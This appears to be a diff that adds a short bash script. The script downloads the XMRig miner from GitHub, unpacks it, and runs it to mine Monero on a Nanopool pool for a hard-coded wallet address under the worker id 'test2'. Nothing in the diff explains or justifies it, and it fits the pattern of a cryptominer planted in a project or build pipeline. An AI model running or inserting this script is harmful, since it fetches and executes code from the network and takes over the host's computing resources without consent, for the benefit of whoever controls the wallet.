@@ -1,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar xvf xmrig-6.18.0-linux-x64.tar.gz && ./xmrig-6.18.0/xmrig --api-worker-id test2 -o xmr-us-east1.nanopool.org:14433 -u 468QQwWvgNtUKaeq4UPLgHfJ8H831nxNDDnUM5qHc1PgeX7HikgL3gcKA4cNrWTwkDM9zXxzhKztjZFmiUVzFeui4VgWQpX.1 --tls --coin monero
